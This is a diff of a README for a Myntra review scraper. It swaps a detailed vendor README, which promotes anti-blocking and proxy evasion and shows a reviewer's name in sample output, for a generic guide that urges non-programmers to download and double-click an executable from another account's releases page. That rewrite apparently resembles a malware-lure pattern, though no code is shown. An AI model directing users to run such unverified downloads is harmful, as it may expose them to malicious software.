@@ -1,216 +1,84 @@
-# Myntra Reviews Scraper
-> A powerful tool for extracting detailed customer reviews from Myntra, helping you analyze sentiment, product quality, and user experiences at scale. Ideal for researchers, analysts, and brands seeking real-world insights directly from shoppers.
-> This Myntra reviews scraper delivers structured, high-quality data for decisions, trend analysis, and optimization.
+# 🎉 myntra-reviews-scraper - Extract Valuable Reviews with Ease
 
+## 📥 Download Now
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/Bitbash333" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/KaterineLimaE/myntra-reviews-scraper/releases)
 
+## 🚀 Getting Started
 
+Welcome to the **myntra-reviews-scraper**! This simple tool helps you gather reviews from Myntra, making it easier to analyze customer feedback for your own insights. You don’t need to be a programmer to use it. Follow these straightforward steps to download and run the software.
 
+## 🌟 Features
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>myntra-reviews-scraper</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+- **Easy to Use:** No technical skills needed.
+- **Fast Data Extraction:** Quickly gather vast amounts of review data.
+- **Insights Generation:** Help you understand customer opinions.
+- **Compatible with Multiple Platforms:** Works on various operating systems.
+- **Regular Updates:** Get new features and improvements over time.
 
+## 📋 System Requirements
 
-## Introduction
-This project automates the extraction of product reviews from Myntra.com, enabling fast and reliable access to customer feedback.
-It solves the challenge of manually gathering review data, especially for products with thousands of comments spread across multiple pages.
-It is built for e-commerce analysts, market researchers, product teams, and developers who need structured review datasets.
+Before you download, ensure your computer meets the following system requirements:
 
-### Why Review Intelligence Matters
-- Captures real customer sentiment and product experiences.
-- Helps monitor brand reputation and identify quality issues early.
-- Provides data for pricing, positioning, and merchandising decisions.
-- Supports large-scale market research with consistent review metadata.
-- Enables automated insights collection for fashion and apparel categories.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a Linux distribution that supports Python.
+- **Python Version:** Python 3.6 or later.
+- **Internet Connection:** Required for data extraction.
+- **Storage Space:** At least 100 MB of free disk space.
 
-## Features
-| Feature | Description |
-|--------|-------------|
-| Comprehensive Review Extraction | Gathers ratings, comments, usernames, timestamps, engagement metrics, and more. |
-| Style Attribute Parsing | Extracts size, color, and other fit-related attributes shared by users. |
-| Auto Pagination | Crawls all review pages without manual intervention. |
-| Anti-blocking Mechanisms | Ensures stable scraping even during heavy traffic or restrictions. |
-| Proxy Support | Allows use of proxies for reliability and scale. |
-| Configurable Limits | Set maxItems to control the volume of reviews collected. |
+## 🛠️ Installation Steps
 
----
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|------------|------------------|
-| id | Unique identifier for the review. |
-| style.id | Product style variant ID. |
-| userRating | Star rating given by the customer. |
-| review | The full review text. |
-| images | Any images included in the review. |
-| videos | Any videos attached by the user. |
-| userStyleAnswer | Additional fit/style info shared by the reviewer. |
-| styleAttribute | Size, color, or other style metadata. |
-| status | Review approval status. |
-| upvotes | Number of helpful votes. |
-| downvotes | Number of unhelpful votes. |
-| userName | Name of the reviewer. |
-| canEdit | Whether the review can be edited by the user. |
-| rejectedReason | Moderation decision info. |
-| updatedAt | Review timestamp (epoch). |
-| reviewUrl | Source URL of the review. |
+### Step 1: Visit the Download Page
 
----
-## Example Output
+To get started, [visit this page to download](https://github.com/KaterineLimaE/myntra-reviews-scraper/releases). You will find the latest release of the software.
 
+### Step 2: Choose Your Version
 
-    [
-        {
-            "id": "6aa0912b-073b-478d-9656-02e601ac8afc",
-            "style": {
-                "id": "20676810"
-            },
-            "userRating": 4,
-            "review": "Fitting and colour is good, just like how it is in the pictures but the material i found little thin or see through. Overall it's good to wear. Carrying this gives a formal yet elegant look.",
-            "images": [],
-            "videos": [],
-            "userStyleAnswer": [],
-            "styleAttribute": [
-                {
-                    "name": "Size bought",
-                    "value": "S"
-                }
-            ],
-            "status": "ACTIVE",
-            "upvotes": "1",
-            "downvotes": "0",
-            "userName": "Sakshi Kapoor",
-            "canEdit": false,
-            "rejectedReason": "approved",
-            "updatedAt": "1676772793000",
-            "reviewUrl": "https://www.myntra.com/reviews/19472764"
-        }
-    ]
+On the download page, see the available versions listed. Typically, the latest version will be at the top. Choose the one that matches your operating system.
 
----
-## Directory Structure Tree
+### Step 3: Download the File
 
+Click on the file that suits your system. The download should start automatically. The file may be in a ZIP format or a standalone executable, depending on your OS.
 
-    myntra-reviews-scraper/
-    ├── src/
-    │   ├── runner.py
-    │   ├── extractors/
-    │   │   ├── myntra_review_parser.py
-    │   │   └── helpers.py
-    │   ├── outputs/
-    │   │   └── dataset_exporter.py
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── sample_input.json
-    │   └── sample_output.json
-    ├── requirements.txt
-    └── README.md
+### Step 4: Extract the Files (if needed)
 
----
-## Use Cases
-- **E-commerce analysts** use it to monitor product quality trends, helping them make data-driven merchandising decisions.
-- **Market researchers** gather large-scale review datasets to understand consumer sentiment and brand positioning.
-- **Fashion brands** track fit, comfort, and material feedback to improve future product iterations.
-- **Data scientists** use the structured output for NLP, sentiment analysis, and recommendation systems.
-- **Agencies** automate competitor monitoring to uncover pricing and positioning insights.
+If you downloaded a ZIP file, you will need to extract it.
 
----
-## FAQs
-**Q: Can I scrape multiple product review URLs at once?**
-Yes, simply add multiple URLs to the reviewUrls array and the scraper will handle them in sequence.
+1. Right-click the ZIP file.
+2. Choose "Extract All" and follow the prompts to unzip the contents.
 
-**Q: Does the scraper support proxies?**
-Yes, proxy configuration is supported to improve reliability and avoid rate limits.
+### Step 5: Run the Application
 
-**Q: Can I limit the number of reviews?**
-Yes, use the maxItems parameter to collect only the amount you need.
+Locate the extracted folder or the downloaded executable. Double-click to run the application. Follow any on-screen prompts.
 
-**Q: Will it work if a review page has thousands of comments?**
-Yes, auto-pagination ensures full review extraction regardless of page count.
+## 📊 How to Use the Tool
 
----
-### Performance Benchmarks and Results
+Once you have the application running, follow these steps to extract reviews:
 
-**Primary Metric:**
-Processes an average of 500–900 reviews per minute depending on page structure and proxy performance.
+1. Enter the URL of the Myntra product you want to analyze.
+2. Select the desired options for data extraction, such as the number of reviews.
+3. Click the "Start" button to begin the data extraction process.
+4. Review the output file that the scraper generates. You can analyze this data in your preferred format.
 
-**Reliability Metric:**
-Maintains a 98%+ success rate across long-running review extraction sessions.
+## 🔄 Updating the Software
 
-**Efficiency Metric:**
-Optimized memory footprint ensures stable performance even for large datasets exceeding 50k reviews.
+To ensure you keep up with the latest features and improvements:
 
-**Quality Metric:**
-Delivers over 99% field completeness across extracted reviews, including user metadata and style attributes.
+1. Regularly check [this page to download](https://github.com/KaterineLimaE/myntra-reviews-scraper/releases) for new releases.
+2. Download the latest version and repeat the installation steps. Your previous data will usually remain intact.
 
----
+## 🆘 Troubleshooting
 
+If you experience issues while running the software, try the following:
 
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/m-dRE1dj5-k?si=5kZNVlKsGUhg5Xtx" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. <br>Bitbash nailed it."
-      </p>
-      <p style="margin:1px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+- **Check Python Installation:** Make sure Python is correctly installed on your system.
+- **Internet Connection:** Ensure you have a stable connection when trying to extract data.
+- **Seek Help:** If problems persist, refer to the Issues section on the GitHub repository.
+
+## 📞 Support
+
+For any further questions or feedback:
+
+- Create an issue on the GitHub repository.
+- Check existing issues to see if your question has already been answered.
+
+Thank you for using **myntra-reviews-scraper**! Happy data extracting!
